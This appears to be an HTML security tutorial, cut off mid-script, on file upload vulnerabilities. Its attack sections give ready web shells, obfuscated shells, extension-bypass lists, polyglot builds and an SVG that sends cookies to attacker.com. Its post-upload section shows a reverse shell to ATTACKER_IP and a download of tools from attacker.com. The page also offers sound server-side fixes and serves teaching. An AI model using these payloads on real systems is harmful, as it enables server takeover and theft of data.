@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>File Upload Vulnerabilities</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:#0f0f11;color:#e2e2e6;padding:24px;line-height:1.6;font-size:14px}
+h1{font-size:22px;font-weight:500;margin-bottom:4px}
+.sub{color:#888;font-size:13px;margin-bottom:20px}
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.tab-btn{background:none;border:1px solid #2a2a30;padding:6px 16px;border-radius:8px;cursor:pointer;font-size:13px;color:#aaa;transition:all .15s}
+.tab-btn.active{background:#1e1e26;color:#e2e2e6;border-color:#555;font-weight:500}
+.tab-panel{display:none}.tab-panel.active{display:block}
+.code{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:12px;line-height:1.7;color:#aaa;white-space:pre-wrap;margin:8px 0;overflow-x:auto}
+.badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:6px;font-weight:500}
+.b-red{background:#3a1515;color:#f87171}
+.b-green{background:#0f2a1a;color:#4ade80}
+.b-amber{background:#2a1d0a;color:#fbbf24}
+.b-blue{background:#0d1f3a;color:#60a5fa}
+.b-purple{background:#1e1030;color:#c084fc}
+.b-teal{background:#0a2020;color:#2dd4bf}
+.result-box{padding:10px 14px;border-radius:8px;font-size:13px;line-height:1.6;margin-top:8px}
+.r-red{background:#2a1010;border:1px solid #5a2020;color:#f87171}
+.r-green{background:#0d2218;border:1px solid #1a4a30;color:#4ade80}
+.r-amber{background:#2a1c08;border:1px solid #5a3a10;color:#fbbf24}
+.fix-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px;border-left:3px solid #4ade80}
+.fix-card.danger{border-left-color:#f87171}
+.fix-card.warn{border-left-color:#fbbf24}
+.fix-card.info{border-left-color:#60a5fa}
+.sc-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px}
+.sc-red{border-left:3px solid #f87171}
+.sc-amber{border-left:3px solid #fbbf24}
+.sc-blue{border-left:3px solid #60a5fa}
+.sc-purple{border-left:3px solid #c084fc}
+.sc-teal{border-left:3px solid #2dd4bf}
+.step-row{display:flex;align-items:flex-start;gap:12px;padding:10px 0;border-bottom:1px solid #1e1e26}
+.step-row:last-child{border-bottom:none}
+.snum{min-width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;flex-shrink:0}
+.snum.d{background:#3a1515;color:#f87171}
+.snum.g{background:#0f2a1a;color:#4ade80}
+.snum.b{background:#0d1f3a;color:#60a5fa}
+.snum.p{background:#1e1030;color:#c084fc}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:580px){.grid2{grid-template-columns:1fr}}
+input,select{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:7px 12px;color:#e2e2e6;font-size:13px;outline:none;transition:border .15s;font-family:'Courier New',monospace}
+input:focus,select:focus{border-color:#555}
+.mono-out{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:11px;line-height:1.7;min-height:120px;overflow:auto;color:#aaa;white-space:pre-wrap}
+.chip{font-size:11px;color:#666;margin-bottom:4px}
+.preset-btn{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:5px 12px;cursor:pointer;font-size:12px;color:#aaa;transition:all .15s}
+.preset-btn:hover{border-color:#555;color:#e2e2e6}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{text-align:left;padding:8px 10px;font-weight:500;color:#888;border-bottom:1px solid #2a2a30}
+td{padding:8px 10px;border-bottom:1px solid #1e1e26;vertical-align:top}
+tr:last-child td{border-bottom:none}
+</style>
+</head>
+<body>
+
+<h1>File Upload Vulnerabilities</h1>
+<p class="sub">OWASP A04 Insecure Design · CWE-434 · Upload a web shell, achieve RCE — one of the most direct paths to full server compromise</p>
+
+<div class="tabs">
+  <button class="tab-btn active" onclick="showTab('concept',this)">How it works</button>
+  <button class="tab-btn" onclick="showTab('demo',this)">Live demo</button>
+  <button class="tab-btn" onclick="showTab('bypass',this)">Extension bypasses</button>
+  <button class="tab-btn" onclick="showTab('polyglot',this)">Polyglot files</button>
+  <button class="tab-btn" onclick="showTab('shells',this)">Web shells</button>
+  <button class="tab-btn" onclick="showTab('fix',this)">Fixes</button>
+</div>
+
+<!-- CONCEPT -->
+<div class="tab-panel active" id="tab-concept">
+  <p style="font-size:13px;color:#888;margin-bottom:16px;">File upload vulnerabilities occur when a server accepts attacker-controlled files without properly validating their type or contents, then stores or processes them in a way that leads to code execution. The classic attack is uploading a web shell — a PHP/JSP/ASPX file that executes OS commands when accessed via HTTP.</p>
+
+  <svg width="100%" viewBox="0 0 680 360" style="max-width:680px;display:block;margin:0 auto 16px;">
+    <defs>
+      <marker id="arr" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </marker>
+    </defs>
+
+    <!-- Step boxes -->
+    <rect x="20" y="30" width="120" height="56" rx="8" fill="#2a1010" stroke="#f87171" stroke-width="0.8"/>
+    <text x="80" y="52" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">① Upload</text>
+    <text x="80" y="68" text-anchor="middle" font-size="10" fill="#f87171" font-family="Courier New,monospace">shell.php</text>
+    <text x="80" y="82" text-anchor="middle" font-size="10" fill="#f87171" font-family="system-ui" opacity="0.7">disguised as image</text>
+
+    <rect x="185" y="30" width="120" height="56" rx="8" fill="#2a1a08" stroke="#fbbf24" stroke-width="0.8"/>
+    <text x="245" y="52" text-anchor="middle" font-size="11" font-weight="600" fill="#fbbf24" font-family="system-ui">② Server stores</text>
+    <text x="245" y="68" text-anchor="middle" font-size="10" fill="#fbbf24" font-family="Courier New,monospace">/uploads/shell.php</text>
+    <text x="245" y="82" text-anchor="middle" font-size="10" fill="#fbbf24" font-family="system-ui" opacity="0.7">weak validation</text>
+
+    <rect x="350" y="30" width="120" height="56" rx="8" fill="#2a1010" stroke="#f87171" stroke-width="0.8"/>
+    <text x="410" y="52" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">③ Attacker GET</text>
+    <text x="410" y="68" text-anchor="middle" font-size="10" fill="#f87171" font-family="Courier New,monospace">/uploads/shell.php</text>
+    <text x="410" y="82" text-anchor="middle" font-size="10" fill="#f87171" font-family="system-ui" opacity="0.7">?cmd=id</text>
+
+    <rect x="515" y="30" width="145" height="56" rx="8" fill="#3a1515" stroke="#f87171" stroke-width="1"/>
+    <text x="587" y="52" text-anchor="middle" font-size="12" font-weight="600" fill="#f87171" font-family="system-ui">④ RCE</text>
+    <text x="587" y="68" text-anchor="middle" font-size="10" fill="#f87171" font-family="Courier New,monospace">uid=33(www-data)</text>
+    <text x="587" y="82" text-anchor="middle" font-size="10" fill="#f87171" font-family="system-ui" opacity="0.7">full server access</text>
+
+    <line x1="142" y1="58" x2="183" y2="58" stroke="#f87171" stroke-width="1.5" marker-end="url(#arr)"/>
+    <line x1="307" y1="58" x2="348" y2="58" stroke="#f87171" stroke-width="1.5" marker-end="url(#arr)"/>
+    <line x1="472" y1="58" x2="513" y2="58" stroke="#f87171" stroke-width="1.5" marker-end="url(#arr)"/>
+
+    <!-- Validation layers -->
+    <rect x="20" y="120" width="640" height="220" rx="10" fill="#13131a" stroke="#2a2a30" stroke-width="0.8"/>
+    <text x="340" y="142" text-anchor="middle" font-size="12" font-weight="600" fill="#ccc" font-family="system-ui">What servers check — and how each is bypassed</text>
+
+    <rect x="36" y="156" width="184" height="168" rx="8" fill="#2a1010" stroke="#5a2020" stroke-width="0.8"/>
+    <text x="128" y="175" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">Extension check</text>
+    <text x="52" y="194" font-size="10" fill="#888" font-family="system-ui">Blocks: .php .php5 .phtml</text>
+    <text x="52" y="210" font-size="10" fill="#f87171" font-family="system-ui">Bypass: shell.php.jpg</text>
+    <text x="52" y="226" font-size="10" fill="#f87171" font-family="system-ui">Bypass: shell.PHP (case)</text>
+    <text x="52" y="242" font-size="10" fill="#f87171" font-family="system-ui">Bypass: shell.pHp5</text>
+    <text x="52" y="258" font-size="10" fill="#f87171" font-family="system-ui">Bypass: shell.php%00.jpg</text>
+    <text x="128" y="306" text-anchor="middle" font-size="10" fill="#f87171" font-family="system-ui" opacity="0.8">easiest to bypass</text>
+
+    <rect x="248" y="156" width="184" height="168" rx="8" fill="#2a1a08" stroke="#5a3a10" stroke-width="0.8"/>
+    <text x="340" y="175" text-anchor="middle" font-size="11" font-weight="600" fill="#fbbf24" font-family="system-ui">MIME type check</text>
+    <text x="264" y="194" font-size="10" fill="#888" font-family="system-ui">Checks Content-Type header</text>
+    <text x="264" y="210" font-size="10" fill="#fbbf24" font-family="system-ui">Bypass: change header</text>
+    <text x="264" y="226" font-size="10" fill="#888" font-family="Courier New,monospace">Content-Type: image/jpeg</text>
+    <text x="264" y="242" font-size="10" fill="#888" font-family="system-ui">Body still contains PHP</text>
+    <text x="264" y="258" font-size="10" fill="#fbbf24" font-family="system-ui">Header is client-controlled!</text>
+    <text x="340" y="306" text-anchor="middle" font-size="10" fill="#fbbf24" font-family="system-ui" opacity="0.8">trivially bypassed</text>
+
+    <rect x="460" y="156" width="184" height="168" rx="8" fill="#0d2218" stroke="#1a4a30" stroke-width="0.8"/>
+    <text x="552" y="175" text-anchor="middle" font-size="11" font-weight="600" fill="#4ade80" font-family="system-ui">Magic bytes check</text>
+    <text x="476" y="194" font-size="10" fill="#888" font-family="system-ui">Reads file header bytes</text>
+    <text x="476" y="210" font-size="10" fill="#888" font-family="Courier New,monospace">JPEG: FF D8 FF</text>
+    <text x="476" y="226" font-size="10" fill="#888" font-family="Courier New,monospace">PNG:  89 50 4E 47</text>
+    <text x="476" y="242" font-size="10" fill="#4ade80" font-family="system-ui">Bypass: prepend magic</text>
+    <text x="476" y="258" font-size="10" fill="#4ade80" font-family="Courier New,monospace">ÿØÿ&lt;?php system...?&gt;</text>
+    <text x="552" y="306" text-anchor="middle" font-size="10" fill="#4ade80" font-family="system-ui" opacity="0.8">harder but still bypassable</text>
+  </svg>
+</div>
+
+<!-- LIVE DEMO -->
+<div class="tab-panel" id="tab-demo">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Simulate uploading a file to a vulnerable server. The demo shows what validation the server runs, whether the bypass succeeds, and what the attacker can do next.</p>
+
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px;">
+    <div>
+      <div class="chip">Filename</div>
+      <input type="text" id="filename-input" value="shell.php" style="width:100%;" oninput="runUpload()"/>
+    </div>
+    <div>
+      <div class="chip">Content-Type header</div>
+      <input type="text" id="mime-input" value="application/x-php" style="width:100%;" oninput="runUpload()"/>
+    </div>
+  </div>
+
+  <div style="margin-bottom:10px;">
+    <div class="chip">File content (first 64 bytes matter for magic bytes check)</div>
+    <input type="text" id="content-input" value="&lt;?php system($_GET['cmd']); ?&gt;" style="width:100%;" oninput="runUpload()"/>
+  </div>
+
+  <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px;">
+    <span style="font-size:12px;color:#888;align-self:center">Presets:</span>
+    <button class="preset-btn" onclick="setPreset('raw')">Raw PHP shell</button>
+    <button class="preset-btn" onclick="setPreset('double')">Double extension</button>
+    <button class="preset-btn" onclick="setPreset('case')">Case bypass</button>
+    <button class="preset-btn" onclick="setPreset('mime')">MIME spoof</button>
+    <button class="preset-btn" onclick="setPreset('magic')">Magic bytes bypass</button>
+    <button class="preset-btn" onclick="setPreset('null')">Null byte</button>
+    <button class="preset-btn" onclick="setPreset('htaccess')">.htaccess</button>
+    <button class="preset-btn" onclick="setPreset('legit')">Legit image</button>
+  </div>
+
+  <div class="grid2">
+    <div>
+      <div style="font-size:12px;font-weight:600;margin-bottom:6px;color:#f87171;">Vulnerable server <span style="font-weight:400;color:#666;font-size:11px">— weak checks</span></div>
+      <div class="mono-out" id="vuln-out"></div>
+    </div>
+    <div>
+      <div style="font-size:12px;font-weight:600;margin-bottom:6px;color:#4ade80;">Secure server <span style="font-weight:400;color:#666;font-size:11px">— strict validation</span></div>
+      <div class="mono-out" id="safe-out"></div>
+    </div>
+  </div>
+  <div id="verdict" class="result-box" style="margin-top:10px;"></div>
+</div>
+
+<!-- EXTENSION BYPASSES -->
+<div class="tab-panel" id="tab-bypass">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Extension blocklists are the most common — and weakest — upload defense. Here is every technique to bypass them.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">PHP extension variants — all execute as PHP</div>
+    <div class="code">## Apache with AddHandler or mod_php
+shell.php        # obvious — usually blocked
+shell.php3       # old PHP3 — often missed
+shell.php4       # PHP4 — often missed
+shell.php5       # PHP5 — often missed
+shell.php7       # PHP7 — often missed
+shell.phtml      # PHP HTML — frequently missed
+shell.phar       # PHP Archive — executes as PHP
+shell.shtml      # Server-Side Includes (if mod_include enabled)
+
+## Case variation (on case-insensitive file systems / servers)
+shell.PHP
+shell.Php
+shell.pHp
+shell.PHp5
+
+## Double extensions (Apache processes left-to-right for unknown types)
+shell.php.jpg    # if Apache doesn't know .jpg → falls back to .php
+shell.php.xxxxx  # any unknown extension → Apache tries next handler
+shell.php.gif
+
+## Trailing characters
+shell.php.        # trailing dot (Windows filesystem strips it)
+shell.php%20      # trailing space (stripped by OS)
+shell.php::$DATA  # Windows NTFS alternate data stream
+
+## Null byte (PHP < 5.3.4)
+shell.php%00.jpg  # PHP sees shell.php, file saved as shell.php</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Other server-side languages</div>
+    <div class="code">## ASP / ASPX (IIS)
+shell.asp
+shell.aspx
+shell.asa         # Active Server Application
+shell.ashx        # ASP.NET HTTP Handler
+shell.asmx        # ASP.NET Web Service
+shell.cshtml      # Razor Pages
+
+## JSP (Tomcat / JBoss / WebLogic)
+shell.jsp
+shell.jspx
+shell.jws
+shell.do          # Spring MVC
+
+## ColdFusion
+shell.cfm
+shell.cfml
+
+## Perl / CGI
+shell.pl
+shell.cgi
+
+## Python (if mod_wsgi or similar)
+shell.py          # if .py is registered as executable</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">.htaccess upload — redefine what PHP executes</div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">If the upload directory allows .htaccess files, upload a custom .htaccess that makes the server execute .jpg files as PHP. Then upload a PHP shell with a .jpg extension — it executes.</p>
+    <div class="code">## Step 1: Upload .htaccess to the uploads directory
+Filename: .htaccess
+Content:
+AddType application/x-httpd-php .jpg
+# Now ALL .jpg files in this directory execute as PHP!
+
+## Step 2: Upload shell with .jpg extension
+Filename: shell.jpg
+Content: &lt;?php system($_GET['cmd']); ?&gt;
+
+## Step 3: Access the shell
+GET /uploads/shell.jpg?cmd=id
+→ uid=33(www-data)
+
+## Alternative .htaccess payloads:
+AddHandler php5-script .png    # execute .png as PHP
+php_value auto_prepend_file /etc/passwd  # prepend file to every response
+Options +ExecCGI               # enable CGI execution</div>
+  </div>
+</div>
+
+<!-- POLYGLOT FILES -->
+<div class="tab-panel" id="tab-polyglot">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">A polyglot file is simultaneously valid in two formats — a real JPEG that is also valid PHP. It passes magic byte checks (real JPEG header) and content validation (parseable as an image) while still executing as PHP when the server includes it.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">JPEG + PHP polyglot</div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">JPEG files store metadata in EXIF fields. PHP code injected into the EXIF <code style="font-family:'Courier New',monospace;font-size:11px">Comment</code> field survives image re-processing and executes when the file is included by PHP.</p>
+    <div class="code">## Method 1: inject into EXIF Comment field
+exiftool -Comment='&lt;?php system($_GET["cmd"]); ?&gt;' image.jpg
+# Creates a valid JPEG with PHP in the EXIF comment
+# Magic bytes: FF D8 FF (real JPEG) → passes magic bytes check
+# PHP scans for &lt;?php tag anywhere in file → finds it → executes
+
+## Method 2: hex edit — prepend JPEG header to PHP
+# Create: [FF D8 FF E0 ... JPEG header ...][&lt;?php system(...); ?&gt;]
+# PHP ignores binary before &lt;?php → executes the shell
+
+## Method 3: GIF + PHP
+echo 'GIF89a;&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.gif
+# GIF magic bytes: 47 49 46 38 39 61 ("GIF89a")
+# PHP executes everything after the magic bytes too
+
+## Confirming the polyglot works
+file shell.gif       # → GIF image data (valid GIF!)
+php -r 'include "shell.gif";'  # executes the PHP!</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">SVG — XSS + SSRF polyglot</div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">SVG is XML — it can contain JavaScript (XSS) and external entity references (SSRF/XXE). If SVG uploads are allowed and served back to users, this is a stored XSS vector.</p>
+    <div class="code">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;text&gt;&amp;xxe;&lt;/text&gt;
+
+  &lt;!-- XSS via SVG event handler --&gt;
+  &lt;rect width="100" height="100"
+    onload="fetch('https://attacker.com/?c='+document.cookie)"/&gt;
+&lt;/svg&gt;
+
+&lt;!-- When rendered in browser: XSS fires, steals cookies
+     When processed server-side: XXE reads /etc/passwd --&gt;</div>
+  </div>
+
+  <div class="sc-card sc-blue">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">PDF + JavaScript — client-side attack</div>
+    <div class="code">## PDF with embedded JavaScript (executes in Adobe Reader / browser PDF viewer)
+## Craft with: msfvenom, metasploit, or custom PDF tools
+
+## More common: PDF generators that fetch external resources
+## Upload a PDF with &lt;img src="http://your-server/"&gt; in HTML content
+## → Server-side PDF generator makes SSRF request to your server
+
+## ZIP / archive attacks
+## Upload zip containing: ../../../etc/cron.d/backdoor
+## If server extracts without path check → zip slip → write anywhere</div>
+  </div>
+</div>
+
+<!-- WEB SHELLS -->
+<div class="tab-panel" id="tab-shells">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">A web shell is a script uploaded to a server that provides remote command execution through HTTP requests. From minimal one-liners to full-featured panels — here is the spectrum.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Minimal web shells</div>
+    <div class="code">## PHP — one-liners
+&lt;?php system($_GET['cmd']); ?&gt;
+&lt;?php passthru($_GET['c']); ?&gt;
+&lt;?php echo shell_exec($_GET['cmd']); ?&gt;
+&lt;?php echo `$_GET[cmd]`; ?&gt;
+&lt;?php eval($_POST['code']); ?&gt;     # execute arbitrary PHP
+
+## PHP — obfuscated (WAF bypass)
+&lt;?php $a='sys'.'tem';$a($_GET[0]); ?&gt;
+&lt;?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?&gt;
+&lt;?php $f=create_function('','system($_GET[1]);');$f(); ?&gt;
+
+## ASP (Classic)
+&lt;% eval request("cmd") %&gt;
+&lt;% Set oSh=Server.CreateObject("WScript.Shell")
+   oSh.Run(request("cmd")) %&gt;
+
+## ASPX (.NET)
+&lt;%@ Page Language="C#" %&gt;
+&lt;% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]); %&gt;
+
+## JSP (Java)
+&lt;% Runtime.getRuntime().exec(request.getParameter("cmd")); %&gt;</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Using the web shell — post-upload actions</div>
+    <div class="code">## Basic RCE
+GET /uploads/shell.php?cmd=id
+GET /uploads/shell.php?cmd=whoami
+GET /uploads/shell.php?cmd=cat+/etc/passwd
+
+## Upgrade to reverse shell (most reliable)
+# Start listener:
+nc -lvp 4444
+
+# Trigger via web shell (URL-encoded):
+?cmd=bash+-c+'bash+-i+>&+/dev/tcp/ATTACKER_IP/4444+0>&1'
+?cmd=python3+-c+'import+socket,subprocess,os;...'
+
+## Enumerate the server
+?cmd=uname+-a           # OS + kernel version
+?cmd=id                  # current user + groups
+?cmd=cat+/etc/passwd
+?cmd=env                 # environment variables (DB creds!)
+?cmd=ps+aux             # running processes
+?cmd=netstat+-tuln       # open ports + services
+
+## Download additional tools
+?cmd=curl+http://attacker.com/linpeas.sh+-o+/tmp/lp.sh
+?cmd=chmod+%2Bx+/tmp/lp.sh+%26%26+/tmp/lp.sh</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Full-featured web shell panels</div>
+    <div class="code">## China Chopper — 2-byte client shell
+# Server component (just 2 bytes!):
+&lt;?php @eval($_POST['password'])?&gt;
+# Feature-rich client software connects to it
+
+## WSO (Web Shell by Orb)
+# Features: file manager, SQL client, network scanner,
+#            port scanner, reverse shell, bruteforcer
+
+## b374k
+# Features: file manager, command exec, process list,
+#            encoded comms, password protected
+
+## Weevely (Python-based)
+weevely generate mypassword ./shell.php
+weevely http://target.com/uploads/shell.php mypassword
+# Full shell session, traffic obfuscated</div>
+  </div>
+
+  <div style="background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;margin-top:4px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;color:#ccc;">Zip Slip — path traversal via archive upload</div>
+    <div class="code">## Create malicious ZIP with path traversal filename
+python3 -c "
+import zipfile
+with zipfile.ZipFile('evil.zip', 'w') as z:
+    z.write('shell.php', '../../../var/www/html/shell.php')
+"
+# When server extracts: writes shell.php to web root!
+# Tools: evilarc, zip-slip-vulnerability
+
+## Also works with: tar, tar.gz, jar, war, apk, docx (they're all ZIPs)</div>
+  </div>
+</div>
+
+<!-- FIXES -->
+<div class="tab-panel" id="tab-fix">
+
+  <div class="fix-card danger">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">① Never execute uploaded files — serve from a separate domain <span class="badge b-red">Root fix</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">The fundamental defense: uploaded files must never be executed by the server. Serve them from a static file server, CDN, or a completely separate domain with no server-side execution. Even if an attacker uploads a PHP file to <code style="font-family:'Courier New',monospace;font-size:11px">uploads.myapp.com</code>, it renders as text — not executed.</div>
+    <div class="code">## nginx — serve uploads as static files only, no PHP
+server {
+    listen 80;
+    server_name uploads.myapp.com;
+
+    location /uploads/ {
+        root /var/www;
+        # NO php-fpm pass-through
+        # NO fastcgi_pass
+        add_header Content-Disposition "attachment";  # force download
+    }
+}
+
+## Apache — disable PHP execution in uploads directory
+# /var/www/html/uploads/.htaccess
+php_flag engine off        # disable PHP entirely
+AddType text/plain .php .php5 .phtml .phar  # serve as text
+Options -ExecCGI           # disable CGI
+
+## Best practice: store outside web root entirely
+/var/uploads/  ← not accessible via HTTP directly
+# Serve via a controller that reads and streams the file</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">② Validate file type server-side — magic bytes + re-encode <span class="badge b-green">Essential</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Never trust the extension or Content-Type header — both are client-controlled. Read the actual file bytes and verify the magic signature. For images, re-encode with a library to strip any embedded payload.</div>
+    <div class="code">## Python — magic bytes check + PIL re-encode (strips payloads)
+from PIL import Image
+import imghdr, io
+
+def validate_image(file_bytes):
+    # Check magic bytes
+    kind = imghdr.what(None, h=file_bytes)
+    if kind not in ('jpeg', 'png', 'gif', 'webp'):
+        raise ValueError(f"Invalid image type: {kind}")
+
+    # Re-encode with PIL — strips EXIF, polyglots, embedded PHP
+    img = Image.open(io.BytesIO(file_bytes))
+    output = io.BytesIO()
+    img.save(output, format=img.format)  # clean copy
+    return output.getvalue()
+
+## Node.js — file-type library for magic bytes
+const FileType = require('file-type');
+const allowed = ['image/jpeg', 'image/png', 'image/gif'];
+
+const type = await FileType.fromBuffer(buffer);
+if (!type || !allowed.includes(type.mime)) {
+    throw new Error('Invalid file type');
+}
+
+## PHP — getimagesize() is NOT sufficient (bypassed by polyglots)
+## Use finfo_file() for MIME + PIL re-encode:</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">③ Rename uploaded files to random names <span class="badge b-green">Always do this</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Even if a PHP file is uploaded, the attacker must be able to request it by URL to execute it. Renaming to a UUID with a safe extension removes the ability to predict the path — and strips any dangerous extension.</div>
+    <div class="code">## Python
+import uuid, os
+
+def save_upload(file_bytes, original_name):
+    # Generate unpredictable name with safe extension
+    safe_ext = '.jpg'  # always use safe extension regardless of input
+    new_name = str(uuid.uuid4()) + safe_ext
+    save_path = os.path.join('/var/uploads', new_name)
+
+    with open(save_path, 'wb') as f:
+        f.write(file_bytes)
+
+    return new_name  # store this in DB, not the original name
+
+## Node.js (multer)
+const multer = require('multer');
+const storage = multer.diskStorage({
+  destination: '/var/uploads/',
+  filename: (req, file, cb) => {
+    cb(null, require('crypto').randomUUID() + '.jpg');
+  }
+});
+
+## Benefits:
+# - shell.php → 3f2d9a1b-4e82-4c1a-a9d2-c97f8e0b3a41.jpg
+# - Attacker can't guess the URL → can't trigger execution
+# - Even if execution weren't disabled, .jpg won't run as PHP</div>
+  </div>
+
+  <div class="fix-card warn">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">④ Size limits, rate limiting, and antivirus scanning <span class="badge b-amber">Defense in depth</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Enforce maximum file size (prevents DoS via giant files). Rate-limit uploads per user to prevent brute-force extension scanning. Run uploaded files through antivirus (ClamAV) to catch known web shells.</div>
+    <div class="code">## File size limit
+MAX_UPLOAD_SIZE = 5 * 1024 * 1024  # 5MB
+
+if len(file_bytes) &gt; MAX_UPLOAD_SIZE:
+    raise ValueError("File too large")
+
+## ClamAV integration (Python)
+import subprocess
+result = subprocess.run(['clamscan', '--no-summary', filepath],
+                        capture_output=True)
+if result.returncode != 0:
+    os.unlink(filepath)
+    raise ValueError("Malicious file detected")</div>
+  </div>
+
+  <div class="fix-card info">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">⑤ Full secure upload checklist</div>
+    <div style="font-size:12px;color:#888;line-height:1.9;">
+      Store outside web root — inaccessible via HTTP directly &nbsp;·&nbsp;
+      Disable server-side execution in upload directory &nbsp;·&nbsp;
+      Validate magic bytes, not extension or Content-Type &nbsp;·&nbsp;
+      Re-encode images with PIL/ImageMagick to strip payloads &nbsp;·&nbsp;
+      Rename to random UUID + safe extension &nbsp;·&nbsp;
+      Serve from separate domain (uploads.app.com or CDN) &nbsp;·&nbsp;
+      Enforce file size limits &nbsp;·&nbsp;
+      Block .htaccess / .user.ini uploads &nbsp;·&nbsp;
+      Extract archives safely — check for path traversal (zip slip) &nbsp;·&nbsp;
+      Log all uploads with user ID, IP, original filename
+    </div>
+  </div>
+</div>
+
+<script>
+function showTab(id,btn){
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  btn.classList.add('active');
+}
+
+const PRESETS={
+  raw:    {name:'shell.php',        mime:'application/x-php',  content:'<?php system($_GET[\'cmd\']); ?>'},
+  double: {name:'shell.php.jpg',    mime:'image/jpeg',          content:'<?php system($_GET[\'cmd\']); ?>'},
+  case:   {name:'shell.PHP',        mime:'application/x-php',  content:'<?php system($_GET[\'cmd\']); ?>'},
+  mime:   {name:'shell.php',        mime:'image/jpeg',          content:'<?php system($_GET[\'cmd\']); ?>'},
+  magic:  {name:'shell.php.jpg',    mime:'image/jpeg',          content:'ÿØÿ<?php system($_GET[\'cmd\']); ?>'},
+  null:   {name:'shell.php\0.jpg',  mime:'image/jpeg',          content:'<?php system($_GET[\'cmd\']); ?>'},
+  htaccess:{name:'.htaccess',       mime:'text/plain',          content:'AddType application/x-httpd-php .jpg'},
+  legit:  {name:'photo.jpg',        mime:'image/jpeg',          content:'ÿØÿàJFIFxx...(binary JPEG data)'},
+};
+
+function setPreset(key){
+  const p=PRESETS[key];
+  document.getElementById('filename-input').value=p.name;
+  document.getElementById('mime-input').value=p.mime;
+  document.getElementById('content-input').value=p.content;
+  runUpload();
+}
+
+function getExt(name){
+  const clean=name.replace(/\0.*/,''); // strip null byte
+  const parts=clean.split('.');
+  return parts.length>1?parts[parts.length-1].toLowerCase():'';
+}
+
+function isPhpExt(ext){
+  return ['php','php3','php4','php5','php7','phtml','phar','shtml'].includes(ext.toLowerCase());
+}
+
+function hasMagicBytes(content){
+  return content.startsWith('ÿØÿ')||content.startsWith('GIF89a')||content.startsWith('\x89PNG')||content.startsWith('JFIF');
+}
+
+function hasPhpCode(content){
+  return content.includes('<?php')||content.includes('<%')||content.includes('<jsp:');
+}
+
+function runUpload(){
+  const fname=document.getElementById('filename-input').value.trim();
+  const mime=document.getElementById('mime-input').value.trim();
